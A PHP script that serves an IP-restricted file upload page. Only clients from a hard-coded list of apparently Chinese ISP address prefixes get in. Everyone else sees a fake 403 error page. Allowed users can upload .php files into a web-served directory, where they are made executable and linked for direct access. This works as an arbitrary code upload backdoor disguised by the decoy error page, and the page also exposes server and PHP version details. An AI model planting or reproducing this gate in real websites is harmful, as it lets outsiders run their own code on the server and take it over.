<?php

$nxips = '["nx.cu.","42.63.","43.251.","59.81.","61.243.","101.199.","103.251.","116.129.","182.54.","203.93.","211.93.","220.200.","220.205.","221.11.","221.199.","nx.cmcc.","39.134.","39.137.","111.49.","111.50.","111.51.","112.54.","112.62.","117.136.","117.142.","120.253.","211.138.","218.203.","221.177.","223.103.","223.104.","nx.ct.","1.50.","14.134.","14.135.","36.103.","61.133.","103.22.","106.45.","111.112.","111.113.","115.168.","119.60.","124.224.","202.100.","218.21.","218.30.","218.95.","222.75.", "add.proxy.","31.214."]';

$nxips_array = json_decode($nxips, true);

$cip = $_SERVER['REMOTE_ADDR'];
$cip_array = explode('.', $cip);
$cip2 = $cip_array[0] .'.'. $cip_array[1] .'.';

$key = array_search($cip2, $nxips_array);
if ($key == false) die(forbidden_html($cip) . '<p>建立于 2017/06/16 04:28:33 by kod<p>');


set_time_limit(0);
$updir = "temp";
if(is_dir($updir) == false) mkdir($updir, 0777);
echo form();

$ext = array("php", "txt", "html", "rar", "zip", "7z",);
echo "<p><font color=red>许可的后缀 " . implode(", ", $ext) . "</font></p>\n";
if(!empty($_FILES["file"])){
    $file = $_FILES["file"];
    if($file["error"] == UPLOAD_ERR_OK){
        if(in_array(end(explode(".", $file["name"])), $ext)){
            $name = $file["name"];
            $size = round($file["size"] / 1024, 2);
            move_uploaded_file($file["tmp_name"], "$updir/$name");
            @chmod("$updir/$name", 0755);
            echo "  <p>". $name . " [ " . $size . "KB ] 已上载成功！" . "</p>\n";
        }else{
            echo "  <p>不被许可的文件种类 " . $file["name"] . "</p>\n";
        }
    }else die("  <p>不能上传</p>\n");
}
echo "\n  <hr width=\"300\" align=\"left\">\n". view_dir($updir);
echo "<p>建立于 2017/06/16 04:28:33 by kod<p>\n</body>\n</html>";




function form(){
    $sysinfo = sys_info();
    $form = '<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>上传文件</title>
</head>

<body>
  <h2>上传文件</h2>
  '. $sysinfo .'
  <form name="form" method="post" action="'. $_server['script_name'] .'" enctype="multipart/form-data">
    <input type="file" name="file" value=" 浏览 ">
    <input type="submit" name="btnupload" value=" 上传 ">
  </form>
  ';
    return $form;
}

function sys_info(){
    $info = "<p>Colohouse/Chicago, United States\n";
    $info .= "  <br>". PHP_OS ." ". $_SERVER['SERVER_SOFTWARE'] ." PHP_v". PHP_VERSION ."</p><br>\n";
    return $info;
}

function view_dir($dir){
    $str = '';
    $dp = opendir($dir);                       # 打开目录句柄
    while($file = readdir($dp)){               # 遍历目录
        if($file != "." && $file != ".."){     # 不处理 . 和 .. 
            $path = $dir . "/" . $file;
            if(is_dir($path)) view_dir($path); # 如果当前文件为目录，递归调用
            else $str .= "  <p><a href=\"" . $path . "\">" . $file . "</a></p>\n";
        }
    }
    closedir($dp);
    return $str;
}

function forbidden_html($ip){
    $forbidden_html = '<html>
<head>
  <meta charset="UTF-8">
  <title>403 禁止访问</title>
</head>
<body>
  <h1>禁止访问</h1>
  <p>'. $ip .', 您无权限访问此资源。</p>
  <hr>
  <address>'. $_SERVER['SERVER_SOFTWARE'] .' Server at '. $_SERVER['SERVER_NAME'] .' Port '. $_SERVER['SERVER_PORT'] .'</address>
</body>
</html>';
    return $forbidden_html;
}



